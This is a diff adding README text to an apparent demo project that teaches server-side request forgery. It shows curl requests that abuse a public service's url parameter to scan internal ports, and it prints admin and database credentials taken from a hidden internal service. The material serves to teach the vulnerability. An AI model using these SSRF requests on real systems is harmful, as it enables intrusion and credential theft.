@@ -35,7 +35,54 @@ We have created three service for demo purpose
 2. **internal-user-service** : This service is not exposed to internet but the resources can be accessible by **public web server**
 3. **internal-admin-service** : This service is not exposed to internet. Attacker will try to access this service and retrive sensitive data by ssrf attack.
 
+In a internal user service, we have a userdetails endpoint which will provide user related basic information.
+
+### Get User Information
+```java
+curl http://localhost:8080/api/users?url=http://localhost:8081/api/userDetail/0
+```
+### Response
+```json
+{'name':'User-0','id':'0'}
+```
+
+### Get User Address
+```java
+curl http://localhost:8080/api/users?url=http://localhost:8081/api/userAddress/0
+```
+
+### Response
+```json
+{'address':'Ahmedabad, India','id':'0'}
+```
+
+#Attack
+
+**Attacker will try to scan multiple ports via changing port number in url like below and he founds `8083` is reachable port.
+He will try to get `adminDetail` using below endpoint.**
 
 
+### Admin Details
+```json
+curl http://localhost:8080/api/users?url=http://localhost:8083/api/adminDetail
+```
+
+```json
+{'username':'admin','password':'OhMyGod@123'}
+```
+
+### Db Sensitive Details
+```json
+curl http://localhost:8080/api/users?url=http://localhost:8083/api/dbDetail
+```
+
+```json
+{'dbName':'controller','host':'10.0.1.35','username':'root', 'password':'XSuper@#12345', 'port':'5432'}
+```
+
+curl localhost:8080/management/mappings
+
+**Useful Links**
+https://www.hackerone.com/application-security/how-server-side-request-forgery-ssrf
 
 
